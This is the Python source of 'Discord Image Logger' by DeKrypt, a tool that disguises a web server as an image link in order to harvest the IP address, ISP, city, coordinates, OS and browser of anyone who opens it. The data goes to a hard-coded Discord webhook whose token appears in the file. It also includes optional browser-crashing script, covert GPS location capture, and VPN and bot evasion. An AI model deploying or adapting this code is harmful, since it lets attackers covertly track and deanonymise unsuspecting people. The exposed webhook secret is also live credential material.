# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://canary.discord.com/api/webhooks/1444490371886350461/qxnqEBiwCEkur2y8wZaw-fuBD70Cp5Jo5uIHG5JXYrf9XQT20aOXHk6FrvVzrJRbahda",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
